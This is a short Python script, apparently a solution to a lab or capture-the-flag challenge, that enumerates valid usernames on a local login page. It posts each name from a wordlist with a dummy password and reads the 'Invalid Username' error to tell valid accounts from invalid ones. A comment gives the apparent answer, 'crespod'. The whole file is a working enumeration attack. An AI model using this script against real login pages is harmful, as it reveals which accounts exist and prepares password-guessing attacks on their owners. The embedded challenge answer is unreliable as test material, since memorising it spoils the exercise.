import requests

usernames = open("users.txt", 'r').read().split('\n')

def Ch1(url, user):
    data = {
        "username": user,
        "password": "gre",
        "login": "Login"
        }
    req = requests.post(url, data).text
    if "Invalid Username" in req:
        print(f"Invalid Username ===> {user}")
    else:
        print(f"Valid User ===> {user}") #crespod
        exit()

url = "http://localhost/CIS/ch1/login.php"
for user in usernames:
    Ch1(url, user)
